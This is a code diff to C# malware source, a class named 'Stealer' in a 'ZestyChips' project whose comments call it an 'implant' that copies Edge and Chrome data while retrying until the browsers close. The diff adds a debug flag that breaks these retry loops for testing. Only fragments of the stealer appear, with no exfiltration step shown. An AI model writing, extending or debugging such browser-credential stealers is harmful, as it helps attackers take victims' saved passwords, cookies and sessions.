@@ -12,6 +12,11 @@ namespace ZestyChips
 {
     internal class Stealer
     {
+
+        // turn on / off debug mode
+        // debug mode will disable the loops until a secret store opens, allowing it to cleanly exit for testing.
+        const bool DEBUG_MODE = true;
+
         /*
         * Main entrypoint for the stealer to begin..
         */
@@ -131,7 +136,12 @@ namespace ZestyChips
                     // exception will throw most likely if edge is open
                     // implant will continually run until edge is closed / process terminated
                     Helpers.PrintFail($"failed to copy edge data, {ex.Message}");
-                    Thread.Sleep(10000); // slp 10 sec
+                    
+                    if (!DEBUG_MODE) {
+                        Thread.Sleep(10000); // sleep 10 seconds
+                    } else {
+                        break;
+                    }
                 }
             }
 
@@ -190,7 +200,12 @@ namespace ZestyChips
                     // exception will throw most likely if edge is open
                     // implant will continually run until edge is closed / process terminated
                     Helpers.PrintFail($"failed to copy edge data, {ex.Message}");
-                    Thread.Sleep(10000); // slp 10 sec
+                    
+                    if (!DEBUG_MODE) {
+                        Thread.Sleep(10000); // sleep 10 seconds
+                    } else {
+                        break;
+                    }
                 }
             }
 
@@ -272,7 +287,13 @@ namespace ZestyChips
                         // exception will throw most likely if chrome is open
                         // implant will continually run until chrome is closed / process terminated
                         Helpers.PrintInfo("an error occurred copying Chrome data: " + ex.Message);
-                        Thread.Sleep(10000); // sleep 10 seconds
+                        
+                        if (!DEBUG_MODE) {
+                            Thread.Sleep(10000); // sleep 10 seconds
+                        } else {
+                            break;
+                        }
+                        
                     }
                 }
 
